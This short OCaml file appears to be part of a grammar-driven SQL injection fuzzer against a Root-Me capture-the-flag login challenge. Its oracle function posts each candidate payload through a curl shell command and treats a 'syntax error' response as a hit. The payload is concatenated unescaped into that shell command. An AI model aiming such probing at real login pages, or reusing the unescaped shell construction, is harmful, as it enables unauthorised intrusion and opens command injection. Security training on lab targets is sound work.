open Grammar

let oracle_aux (str: string) : bool =
    ignore (Sys.command "sleep 1");
    let s = "curl -i http://challenge01.root-me.org/web-serveur/ch9/ -d \"login="^str^"&password=b\" 2>/dev/null | grep \"syntax error\"" in
    let out = (Sys.command s) == 0 in
    print_endline ("Request: "^s);
    print_endline ("Status: "^(string_of_bool out));
    out

let oracle (inj: part list) : bool =
    List.for_all (fun i -> oracle_aux (string_of_word i)) inj
